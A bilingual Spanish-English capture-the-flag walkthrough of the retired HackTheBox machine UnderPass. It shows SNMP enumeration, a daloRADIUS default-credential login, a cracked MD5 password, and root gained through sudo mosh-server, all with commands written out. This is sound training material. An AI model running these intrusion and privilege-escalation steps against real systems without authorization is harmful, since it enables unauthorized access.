# UnderPass [Easy]

> **ES:** Máquina Linux con SNMP público que delata un daloRADIUS; credenciales por defecto llevan a un hash crackeable y `mosh-server` con sudo da root.
> **EN:** Linux box with public SNMP leaking a daloRADIUS install; default creds lead to a crackable hash and sudo `mosh-server` gives root.

| Campo | Valor |
|-------|-------|
| **Dificultad** | Easy |
| **OS** | Linux |
| **Estado** | Retired |
| **Maker** | [verificar en app.hackthebox.com/machines/UnderPass] |
| **URL** | https://app.hackthebox.com/machines/UnderPass |
| **IP lab** | 10.10.11.48 |
| **Fecha de resolución** | 2026-09-24 |

---

## 🎯 Objetivo / Goal

> **ES:** Conseguir `user.txt` y `root.txt` vía SNMP (public) → daloRADIUS (`administrator:radius`) → hash MD5 de `svcMosh` → SSH → `sudo mosh-server`.
> **EN:** Get `user.txt` and `root.txt` via SNMP (public) → daloRADIUS (`administrator:radius`) → `svcMosh` MD5 hash → SSH → `sudo mosh-server`.

---

## 🛠️ Herramientas usadas / Tools used

- [ ] nmap (TCP + UDP)
- [ ] snmpwalk
- [ ] dirsearch / feroxbuster
- [ ] ssh
- [ ] mosh

---

## 📋 Pasos / Steps

### Paso 1 — Reconocimiento / Recon

> **ES:** TCP solo 22/SSH y 80/Apache; en UDP destaca 161/SNMP con comunidad `public` que filtra el hostname `UnDerPass.htb`.
> **EN:** TCP only 22/SSH and 80/Apache; UDP shows 161/SNMP with community `public` leaking hostname `UnDerPass.htb`.

```bash
nmap -sC -sV -oN nmap_tcp 10.10.11.48
nmap -sU --top-ports=50 -oN nmap_udp 10.10.11.48
nmap --script "snmp* and not snmp-brute" -sU -p 161 10.10.11.48
```

**Resultado / Result:** 22/tcp OpenSSH 8.9, 80/tcp Apache 2.4.52, 161/udp SNMP `public`, sysDescr `Linux underpass 5.15.0-126-generic`.

---

### Paso 2 — Enumeración / Enumeration

> **ES:** Con `snmpwalk` se confirma el banner daloRADIUS; en web `/daloradius/` hay login de operadores y ficheros expuestos (`docker-compose.yml`, `README.md`).
> **EN:** `snmpwalk` confirms the daloRADIUS banner; web `/daloradius/` exposes an operators login plus files (`docker-compose.yml`, `README.md`).

```bash
snmpwalk -v 1 -c public 10.10.11.48 | head -30
dirsearch -u http://10.10.11.48/daloradius/
curl -s http://10.10.11.48/daloradius/docker-compose.yml | head -40
```

**Resultado / Result:** Pista `UnDerPass.htb is the only daloradius server in the basin!`. Capturas en `img/` (ej. `image_20250454-225404.png`) documentan el login.

---

### Paso 3 — Acceso inicial (foothold) / Initial access

> **ES:** Login con defecto `administrator:radius` en `/daloradius/app/operators/login.php`; en la lista de usuarios se lee el hash MD5 de `svcMosh` y se crackea (diccionario/lookup) a `underwaterfriends`.
> **EN:** Default login `administrator:radius` at `/daloradius/app/operators/login.php`; user list leaks `svcMosh` MD5 hash, cracked (dictionary/lookup) to `underwaterfriends`.

```bash
# login web manual: administrator:radius
# hash obtenido: 412DD4759978ACFCC81DEAB01B382403 (md5 -> underwaterfriends)
ssh svcMosh@10.10.11.48
```

**Resultado / Result:** SSH válido `svcMosh:underwaterfriends`.

---

### Paso 4 — Usuario (user.txt) / User

> **ES:** Ya como `svcMosh` se lee `/home/svcMosh/user.txt` (flag omitida).
> **EN:** As `svcMosh` read `/home/svcMosh/user.txt` (flag redacted).

```bash
id; cat ~/user.txt
```

---

### Paso 5 — Root (root.txt) / Privilege escalation

> **ES:** `sudo -l` permite `(ALL) NOPASSWD: /usr/bin/mosh-server`; invocar `mosh --server="sudo /usr/bin/mosh-server" localhost` entrega terminal root (GTFOBins).
> **EN:** `sudo -l` allows `(ALL) NOPASSWD: /usr/bin/mosh-server`; running `mosh --server="sudo /usr/bin/mosh-server" localhost` yields a root terminal (GTFOBins).

```bash
sudo -l
mosh --server="sudo /usr/bin/mosh-server" localhost
whoami  # root
cat /root/root.txt
```

**Resultado / Result:** Root vía `mosh-server` con sudo sin password. Técnica: abuso de binario permitido (GTFOBins).

---

## 🧠 Lo aprendido / Learned

> **ES:** SNMP con comunidad pública como vector de info; daloRADIUS con credenciales por defecto; hashes MD5 débiles; privesc con `mosh-server`.
> **EN:** SNMP public community as info vector; daloRADIUS default creds; weak MD5 hashes; `mosh-server` privesc.

- [ ] Siempre auditar UDP/SNMP, no solo TCP
- [ ] Cambiar credenciales por defecto en paneles
- [ ] Revisar `sudo -l` y GTFOBins

---

## 📚 Fuentes y Referencias / Sources

- **Fuente:** HTB UnderPass — 0xdf (https://0xdf.gitlab.io/2025/05/10/htb-underpass.html) — 0xdf
- **Walkthrough de referencia:** HTB UnderPass — daloRADIUS & mosh-server (https://infosecwriteups.com/htb-underpass-daloradius-mosh-server-b1ae3f5400b1)
- **Fecha de acceso:** 2026-09-24
- **Autor de este walkthrough:** Apuromafo (contenido propio salvo cita)
- **Nota de migración:** Contenido migrado y parafraseado desde `Soluciones/Machines/unclasified/UnderPass/index.md` (notas CN/EN sin normalizar con capturas en `img/`); flags originales omitidas.

---

## ⚠️ Aviso Legal / Disclaimer

> **ES:** Uso educativo y personal únicamente. No afiliado a HackTheBox. No publicar flags de máquinas activas.
> **EN:** Educational and personal use only. Not affiliated with HackTheBox. Do not publish flags of active machines.

_Fecha de edición: 2026-09-24_
